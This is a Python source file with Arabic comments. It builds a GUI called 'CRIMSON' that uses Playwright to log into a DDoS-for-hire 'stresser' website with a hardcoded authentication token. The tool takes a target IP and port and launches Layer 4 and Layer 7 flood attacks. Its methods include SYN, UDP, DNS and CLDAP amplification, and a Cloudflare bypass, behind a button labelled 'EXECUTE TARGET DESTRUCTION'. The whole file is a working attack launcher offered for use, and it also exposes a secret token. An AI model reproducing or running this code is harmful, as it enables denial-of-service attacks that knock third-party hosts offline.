import sys
import time
import threading
import customtkinter as ctk
from playwright.sync_api import sync_playwright

# ==========================================
# 1. إعدادات المظهر العام والهوية البصرية
# ==========================================
ctk.set_appearance_mode("Dark")

# ==========================================
# 2. محرك الأتمتة والمحاكاة الخلفي (Core Engine)
# ==========================================
class RetroAutomationEngine:
    def __init__(self, auth_token):
        self.auth_token = auth_token
        self.base_url = "https://retrostress.net"
        # الميثودز الخاصة بالطبقة السابعة
        self.l7_methods = ["HTTP-BYPASS", "HTTP-CLOUDFLARE", "HTTP-SMART", "TCP-TLS"]

    def execute_payload(self, target, port, method, duration=30, logger_callback=None):
        def log(msg):
            if logger_callback: 
                logger_callback(msg)

        log("🚀 INITIATING CYBER EMULATION MATRIX...")
        try:
            with sync_playwright() as p:
                log("🔍 SPAWNING HEADLESS CHROMIUM ISOLATED CORE...")
                # تشغيل المتصفح في الخلفية بصمت تام
                browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-setuid-sandbox"])
                context = browser.new_page()

                # --- المرحلة الأولى: المصادقة التلقائية بالتوكن ---
                log("🌐 CONNECTING TO RETROSTRESS AUTH PORTAL...")
                context.goto(f"{self.base_url}/auth", wait_until="networkidle")
                
                log("🔑 INJECTING SECURE AUTHENTICATION TOKEN...")
                context.fill("input[type='password'], input[placeholder*='key']", self.auth_token)
                
                log("📡 SUBMITTING CREDENTIAL DATA VIA POST BACK...")
                context.click("text=AUTHENTICATE")
                context.wait_for_load_state("networkidle")

                # --- المرحلة الثانية: التوجيه للوحة التحكم ---
                log("🔓 SECURITY CLEARANCE GRANTED. ROUTING TO PANEL CONSOLE...")
                context.goto(f"{self.base_url}/panel", wait_until="networkidle")

                # --- المرحلة الثالثة: فرز المسار (L4 أو L7) ---
                if method.upper() in self.l7_methods:
                    log("⚡ ROUTING TRAFFIC VIA ADVANCED LAYER 7 PROXY ENGINE...")
                    context.click("text=LAYER 7")
                else:
                    log("💥 ROUTING TRAFFIC VIA LAYER 4 NETWORK AMPLIFIERS...")
                    context.click("text=LAYER 4")

                # --- المرحلة الرابعة: حقن بيانات الهدف ---
                log("🎯 INJECTING TARGET PARAMETERS INTO EXPLOIT SLOTS...")
                context.fill("input[placeholder*='1.2.3.4']", target)
                context.fill("input[placeholder='80']", str(port))
                context.fill("input[placeholder='30']", str(duration))

                # --- المرحلة الخامسة: اختيار الميثود والضغط النهائي ---
                log(f"🧬 SELECTING VECTOR VECTOR [{method.upper()}] FROM CORE REGISTRY...")
                context.click("text=SYN ▾")
                context.fill("input[placeholder='Search methods...']", method.upper())
                context.click(f"text={method.upper()}")

                log("🔥 AUTHORIZING DIGITAL DESTRUCTION COMMAND...")
                context.click("text=EXECUTE_TEST →")
                
                log("🟢 SUCCESS: DISPATCHED SUCCESSFULLY! PAYLOAD EN ROUTE.")
                time.sleep(2)
                browser.close()
                return True
        except Exception as e:
            log(f"❌ CRITICAL FRAMEWORK FAILURE: {str(e)[:50]}")
            return False

# ==========================================
# 3. واجهة المستخدم الرسومية الفاخرة (Front-End HUD)
# ==========================================
class CrimsonUltimateApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        # هندسة أبعاد التطبيق ونظام الإغلاق الحاد
        self.title("CRIMSON // MULTI-SUBSYSTEM CONSOLE v12.0")
        self.geometry("580x800")
        self.resizable(False, False)
        self.configure(fg_color="#000000") # أسود مطلق وعميق

        # التوكن الافتراضي المدمج بشكل صلب
        self.auth_token = "fda76f4ab4e24405ab18e0c55003252873e699f468e54f1fb683258586be1c04"

        # بناء الأنظمة الفرعية للواجهة
        self.build_header_subsystem()
        self.build_inputs_subsystem()
        self.build_console_subsystem()

    def build_header_subsystem(self):
        self.title_label = ctk.CTkLabel(self, text="☣️ CRIMSON CORE SYSTEMS ☣️", font=ctk.CTkFont(family="Courier", size=26, weight="bold"), text_color="#ff0022")
        self.title_label.pack(pady=(25, 2))
        self.sub_title = ctk.CTkLabel(self, text="ENTERPRISE AUTOMATION & OPERATOR HUD", font=ctk.CTkFont(family="Courier", size=10), text_color="#555555")
        self.sub_title.pack(pady=(0, 20))

    def build_inputs_subsystem(self):
        self.main_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.main_frame.pack(padx=35, fill="x")

        # التوكن مدمج ومقفل تريليون % داخل النظام لحمايته
        self.create_hud_label("SECURE_AUTH_TOKEN (HARDCODED_DETECTION):")
        self.token_entry = self.create_hud_entry(self.auth_token)
        self.token_entry.insert(0, self.auth_token)
        self.token_entry.configure(state="disabled", fg_color="#120004", text_color="#ff0033")

        # إدخال الهدف
        self.create_hud_label("TARGET_IP_OR_HOST:")
        self.ip_entry = self.create_hud_entry("1.2.3.4")

        # إدخال البورت
        self.create_hud_label("TARGET_PORT:")
        self.port_entry = self.create_hud_entry("80")

        # قائمة الميثودز المتكاملة والشاملة لجميع الأنواع الحقيقية في الموقع
        self.create_hud_label("ATTACK_VECTOR_METHOD:")
        all_vectors = [
            "SYN", "ACK", "FIN", "RST", "PSH-ACK", "SYN-ACK", "UDP-RAND", 
            "UDP-TINY", "UDP-ZERO", "UDP-BIG", "CLDAP", "DNS", "STUN", 
            "FIVEM", "FIVEM-BYPASS", "Minecraft", "RUST", "HTTP-BYPASS", 
            "HTTP-CLOUDFLARE", "HTTP-SMART", "TCP-KILL", "TCP-TLS"
        ]
        self.method_box = ctk.CTkComboBox(self.main_frame, values=all_vectors, width=510, height=38, fg_color="#080002", border_color="#3a000a", button_color="#ff0022", button_hover_color="#aa0011", text_color="#ffffff", font=ctk.CTkFont(family="Courier", size=12))
        self.method_box.pack(pady=(0, 15))

        # مدة الهجوم مقفلة على 30 ثانية حماية قصوى
        self.create_hud_label("DURATION_LIMIT (LOCKED TO SAFE MAX):")
        self.time_entry = self.create_hud_entry("30 Seconds Fixed")
        self.time_entry.configure(state="disabled", fg_color="#120004", text_color="#ff0033")

        # شريط تقدم الأنيميشن
        self.progress = ctk.CTkProgressBar(self.main_frame, width=510, height=4, fg_color="#111111", progress_color="#ff0022")
        self.progress.set(0)
        self.progress.pack(pady=(10, 15))

    def build_console_subsystem(self):
        # شاشة الكونسول الحية للمراقبة ثانية بثانية
        self.console_output = ctk.CTkTextbox(self, width=510, height=180, fg_color="#030001", border_color="#1a0004", text_color="#ff3355", font=ctk.CTkFont(family="Courier", size=11))
        self.console_output.pack(padx=35, pady=5)
        self.log_to_console("--- SYSTEM ONLINE // ALL SUBSYSTEMS ARMED ---")

        # زر الهجوم الناري الكبير
        self.launch_btn = ctk.CTkButton(self, text="💥 EXECUTE TARGET DESTRUCTION 💥", font=ctk.CTkFont(family="Courier", size=14, weight="bold"), fg_color="#ff0022", hover_color="#990011", text_color="#ffffff", height=52, width=510, command=self.fire_async_thread)
        self.launch_btn.pack(pady=(20, 15))

    def create_hud_label(self, text):
        lbl = ctk.CTkLabel(self.main_frame, text=text, font=ctk.CTkFont(family="Courier", size=11, weight="bold"), text_color="#880512")
        lbl.pack(anchor="w", pady=(0, 4))

    def create_hud_entry(self, placeholder):
        entry = ctk.CTkEntry(self.main_frame, placeholder_text=placeholder, width=510, height=38, fg_color="#080002", border_color="#3a000a", text_color="#ffffff", placeholder_text_color="#3a0c12", font=ctk.CTkFont(family="Courier", size=12))
        entry.pack(pady=(0, 15))
        return entry

    def log_to_console(self, text):
        self.console_output.insert("end", f"\n[{time.strftime('%H:%M:%S')}] {text}")
        self.console_output.see("end")

    def fire_async_thread(self):
        # منع تجميد الواجهة الرسومية عبر تشغيل المحرك في مسار Thread منفصل
        threading.Thread(target=self.run_execution_pipeline, daemon=True).start()

    def run_execution_pipeline(self):
        target = self.ip_entry.get().strip()
        port = self.port_entry.get().strip() or "80"
        method = self.method_box.get()

        if not target:
            self.log_to_console("🔴 DISPATCH FAILURE: TARGET HOST FIELD IS EMPTY!")
            return

        self.launch_btn.configure(state="disabled")
        self.progress.set(0.2)
        
        # استدعاء المحرك المدمج
        engine = RetroAutomationEngine(auth_token=self.auth_token)
        self.progress.set(0.5)
        
        success = engine.execute_payload(target, port, method, duration=30, logger_callback=self.log_to_console)
        
        if success:
            self.progress.set(1.0)
            self.log_to_console("🟢 DISPATCH CYCLE TERMINATED SUCCESSFULLY.")
        else:
            self.progress.set(0)
            self.log_to_console("🔴 CYCLE ABORTED DUE TO ARCHITECTURE ERROR.")
            
        self.launch_btn.configure(state="normal")

# ==========================================
# 4. نقطة انطلاق التطبيق الحقيقية
# ==========================================
if __name__ == "__main__":
    app = CrimsonUltimateApp()
    app.mainloop()
